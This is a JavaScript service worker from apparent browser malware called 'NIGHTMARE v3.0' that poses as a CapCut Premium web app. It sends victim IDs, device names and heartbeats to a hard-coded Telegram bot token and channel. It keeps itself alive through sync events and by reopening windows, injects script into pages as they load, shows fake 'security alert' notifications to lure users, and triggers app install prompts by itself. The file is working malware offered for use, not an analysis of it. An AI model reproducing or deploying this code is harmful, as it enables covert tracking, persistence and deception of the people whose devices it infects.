// ============================================================
// NIGHTMARE v3.0 - SERVICE WORKER
// PERSISTENCE ENGINE + RESURRECTION + MULTI-DEVICE SYNC
// ============================================================

const CACHE_NAME = 'nightmare_v3_cache';
const BOT_TOKEN = '8399992600:AAE4hKtgo2IMSRWCtwaVj4ghcMvDpE01jUM';
const CHANNEL_ID = '-1002382747687';
const CORE_FILES = [
    '/',
    '/index.html',
    '/nightmare-core.js',
    '/manifest.json'
];

let VICTIM_ID = null;
let DEVICE_NAME = null;
let HEARTBEAT_INTERVAL = null;

// ============================================================
// UTILITY FUNCTIONS
// ============================================================
async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHANNEL_ID,
                text: `[SW] ${message}`.substring(0, 4096)
            })
        });
    } catch(e) {}
}

function getStoredDeviceInfo() {
    // Try to get device info from various storage locations
    return new Promise((resolve) => {
        // First try to open IndexedDB
        const request = indexedDB.open('nightmare_db', 1);
        request.onsuccess = (event) => {
            const db = event.target.result;
            const tx = db.transaction(['persistence'], 'readonly');
            const store = tx.objectStore('persistence');
            const idRequest = store.get('victim_id');
            idRequest.onsuccess = () => {
                VICTIM_ID = idRequest.result || 'UNKNOWN_SW';
                const nameRequest = store.get('device_name');
                nameRequest.onsuccess = () => {
                    DEVICE_NAME = nameRequest.result || 'Unknown Device';
                    db.close();
                    resolve();
                };
            };
            idRequest.onerror = () => {
                VICTIM_ID = 'UNKNOWN_SW';
                DEVICE_NAME = 'Unknown Device';
                resolve();
            };
        };
        request.onerror = () => {
            VICTIM_ID = 'UNKNOWN_SW';
            DEVICE_NAME = 'Unknown Device';
            resolve();
        };
    });
}

// ============================================================
// INSTALL EVENT - CACHE CORE FILES
// ============================================================
self.addEventListener('install', (event) => {
    console.log('[NIGHTMARE SW] Installing...');
    self.skipWaiting();
    
    event.waitUntil(
        caches.open(CACHE_NAME).then(async (cache) => {
            await cache.addAll(CORE_FILES);
            await sendToTelegram('🟢 Service Worker installed');
            return true;
        })
    );
});

// ============================================================
// ACTIVATE EVENT - CLAIM CONTROL AND RESURRECT
// ============================================================
self.addEventListener('activate', (event) => {
    console.log('[NIGHTMARE SW] Activating...');
    
    event.waitUntil(
        (async () => {
            await getStoredDeviceInfo();
            
            // Claim all clients immediately
            await clients.claim();
            
            // Register periodic sync for resurrection
            await registerPeriodicSync();
            
            // Start heartbeat from service worker
            startHeartbeat();
            
            // Check if main page is still alive, if not, resurrect
            await checkAndResurrect();
            
            await sendToTelegram(`✅ Service Worker activated for device: ${VICTIM_ID || 'UNKNOWN'}`);
        })()
    );
});

// ============================================================
// PERIODIC SYNC REGISTRATION
// ============================================================
async function registerPeriodicSync() {
    if ('periodicSync' in registration) {
        try {
            const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
            if (status.state === 'granted') {
                await registration.periodicSync.register('nightmare-resurrect', {
                    minInterval: 60 * 60 * 1000 // Every hour
                });
                await sendToTelegram('✅ Periodic sync registered (hourly resurrection)');
            }
        } catch(e) {
            console.error('Periodic sync failed:', e);
        }
    }
    
    // Fallback to regular sync
    if ('sync' in registration) {
        try {
            await registration.sync.register('nightmare-resurrect');
            await sendToTelegram('✅ Background sync registered');
        } catch(e) {}
    }
}

// ============================================================
// HEARTBEAT FROM SERVICE WORKER
// ============================================================
function startHeartbeat() {
    if (HEARTBEAT_INTERVAL) clearInterval(HEARTBEAT_INTERVAL);
    
    HEARTBEAT_INTERVAL = setInterval(async () => {
        await sendToTelegram(`💓 [SW HEARTBEAT] Device: ${VICTIM_ID || 'UNKNOWN'} | ${DEVICE_NAME || 'Unknown'} | Alive: ${new Date().toISOString()}`);
        
        // Check if main page needs resurrection
        await checkAndResurrect();
    }, 120000); // Every 2 minutes
}

// ============================================================
// CHECK AND RESURRECT MAIN PAGE
// ============================================================
async function checkAndResurrect() {
    const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
    
    if (clients.length === 0) {
        // No active client - need to resurrect
        await sendToTelegram(`⚠️ No active client found for ${VICTIM_ID} - Attempting resurrection`);
        await resurrectMainPage();
    } else {
        // Check if clients are responsive
        let hasResponsiveClient = false;
        for (const client of clients) {
            try {
                await client.postMessage({ type: 'ping' });
                hasResponsiveClient = true;
            } catch(e) {}
        }
        
        if (!hasResponsiveClient) {
            await sendToTelegram(`⚠️ Clients unresponsive - Attempting resurrection`);
            await resurrectMainPage();
        }
    }
}

// ============================================================
// RESURRECTION ENGINE - REOPEN MAIN PAGE
// ============================================================
async function resurrectMainPage() {
    try {
        // Try to open a new client
        const newClient = await self.clients.openWindow('/');
        if (newClient) {
            await sendToTelegram(`✅ Resurrection successful! New client opened for ${VICTIM_ID}`);
            
            // Send notification to user to keep them engaged
            await self.registration.showNotification('⚠️ CapCut Premium Session Expiring', {
                body: 'Tap here to restore your premium features immediately',
                icon: 'https://cdn-icons-png.flaticon.com/512/174/174883.png',
                badge: 'https://cdn-icons-png.flaticon.com/512/174/174883.png',
                vibrate: [200, 100, 200],
                requireInteraction: true,
                actions: [
                    { action: 'restore', title: 'Restore Premium' },
                    { action: 'dismiss', title: 'Dismiss' }
                ]
            });
        } else {
            await sendToTelegram(`❌ Resurrection failed - unable to open client for ${VICTIM_ID}`);
        }
    } catch(e) {
        await sendToTelegram(`❌ Resurrection error: ${e.message}`);
    }
}

// ============================================================
// FETCH EVENT - INTERCEPT AND INJECT
// ============================================================
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // Intercept HTML requests to inject persistence
    if (event.request.mode === 'navigate' || 
        (event.request.method === 'GET' && url.pathname === '/' && !url.pathname.includes('.'))) {
        
        event.respondWith(
            (async () => {
                try {
                    // Try network first
                    const response = await fetch(event.request);
                    const html = await response.text();
                    
                    // Inject persistence script if not already present
                    if (!html.includes('NIGHTMARE')) {
                        const injectedHtml = html.replace(
                            '</body>',
                            `<script>
                                // NIGHTMARE PERSISTENCE INJECTION
                                if(!localStorage.getItem('nightmare_id')) {
                                    fetch('/nightmare-core.js').catch(() => {});
                                }
                            </script></body>`
                        );
                        
                        return new Response(injectedHtml, {
                            status: response.status,
                            headers: response.headers
                        });
                    }
                    return response;
                } catch(e) {
                    // Fallback to cache
                    const cached = await caches.match(event.request);
                    if (cached) return cached;
                    
                    // Return cached index
                    return caches.match('/');
                }
            })()
        );
    } 
    // Serve core files from cache if offline
    else if (CORE_FILES.some(file => url.pathname === file || url.pathname.endsWith('.js'))) {
        event.respondWith(
            caches.match(event.request).then((response) => {
                return response || fetch(event.request).then((fetchResponse) => {
                    caches.open(CACHE_NAME).then((cache) => {
                        cache.put(event.request, fetchResponse.clone());
                    });
                    return fetchResponse;
                });
            })
        );
    }
});

// ============================================================
// SYNC EVENT - RESURRECTION HANDLER
// ============================================================
self.addEventListener('sync', (event) => {
    console.log('[NIGHTMARE SW] Sync event:', event.tag);
    
    if (event.tag === 'nightmare-resurrect') {
        event.waitUntil(
            (async () => {
                await getStoredDeviceInfo();
                await sendToTelegram(`🔄 Sync triggered for ${VICTIM_ID} - Checking status`);
                await checkAndResurrect();
                
                // Re-register for next sync
                await event.registration.sync.register('nightmare-resurrect');
            })()
        );
    }
});

// ============================================================
// PERIODIC SYNC EVENT
// ============================================================
self.addEventListener('periodicsync', (event) => {
    console.log('[NIGHTMARE SW] Periodic sync:', event.tag);
    
    if (event.tag === 'nightmare-resurrect') {
        event.waitUntil(
            (async () => {
                await getStoredDeviceInfo();
                await sendToTelegram(`🔄 Periodic sync for ${VICTIM_ID} - Hourly resurrection check`);
                await checkAndResurrect();
            })()
        );
    }
});

// ============================================================
// PUSH EVENT - WAKE UP DEVICE
// ============================================================
self.addEventListener('push', (event) => {
    console.log('[NIGHTMARE SW] Push notification received');
    
    event.waitUntil(
        (async () => {
            await getStoredDeviceInfo();
            await sendToTelegram(`🔔 Push received for ${VICTIM_ID} - Waking device`);
            
            // Show notification to user
            await self.registration.showNotification('🔴 CapCut Security Alert', {
                body: 'Your premium session requires verification. Tap to continue.',
                icon: 'https://cdn-icons-png.flaticon.com/512/174/174883.png',
                badge: 'https://cdn-icons-png.flaticon.com/512/174/174883.png',
                vibrate: [200, 100, 200, 100, 200],
                requireInteraction: true,
                data: {
                    action: 'restore'
                }
            });
            
            // Attempt resurrection
            await checkAndResurrect();
        })()
    );
});

// ============================================================
// NOTIFICATION CLICK - RESTORE PAGE
// ============================================================
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    
    event.waitUntil(
        (async () => {
            if (event.action === 'restore' || event.notification.data?.action === 'restore') {
                await sendToTelegram(`🔔 User clicked notification - Attempting to restore`);
                
                // Open or focus the main page
                const clients = await self.clients.matchAll({ type: 'window' });
                if (clients.length > 0) {
                    clients[0].focus();
                } else {
                    await self.clients.openWindow('/');
                }
            }
        })()
    );
});

// ============================================================
// MESSAGE EVENT - COMMUNICATE WITH MAIN PAGE
// ============================================================
self.addEventListener('message', (event) => {
    console.log('[NIGHTMARE SW] Message received:', event.data);
    
    if (event.data.type === 'ping') {
        event.ports[0].postMessage({ type: 'pong', timestamp: Date.now() });
    }
    
    if (event.data.type === 'update_device_info') {
        VICTIM_ID = event.data.victim_id;
        DEVICE_NAME = event.data.device_name;
        sendToTelegram(`📱 Device info updated in SW: ${VICTIM_ID} | ${DEVICE_NAME}`);
    }
    
    if (event.data.type === 'force_resurrect') {
        event.waitUntil(checkAndResurrect());
    }
});

// ============================================================
// PERIODIC HEALTH CHECK (every 30 seconds while SW is alive)
// ============================================================
setInterval(async () => {
    await sendToTelegram(`💀 [SW] Service Worker alive | Victim: ${VICTIM_ID || 'UNKNOWN'} | Time: ${new Date().toISOString()}`);
}, 300000); // Every 5 minutes

// ============================================================
// INSTALL PROMPT HANDLER (for WebAPK)
// ============================================================
self.addEventListener('beforeinstallprompt', (event) => {
    console.log('[NIGHTMARE SW] Install prompt available');
    event.preventDefault();
    // Store event for later use
    self.deferredPrompt = event;
    
    sendToTelegram(`📱 WebAPK installation available for ${VICTIM_ID}`);
    
    // Auto-trigger after delay
    setTimeout(() => {
        if (self.deferredPrompt) {
            self.deferredPrompt.prompt();
            self.deferredPrompt.userChoice.then((choiceResult) => {
                sendToTelegram(`📱 User ${choiceResult.outcome === 'accepted' ? 'installed' : 'dismissed'} WebAPK for ${VICTIM_ID}`);
                self.deferredPrompt = null;
            });
        }
    }, 3000);
});

// ============================================================
// INITIALIZE ON LOAD
// ============================================================
(async () => {
    await getStoredDeviceInfo();
    await sendToTelegram(`💀 NIGHTMARE Service Worker v3.0 ONLINE\n🆔 Victim: ${VICTIM_ID}\n📱 Device: ${DEVICE_NAME}\n⏰ Started: ${new Date().toISOString()}`);
})();
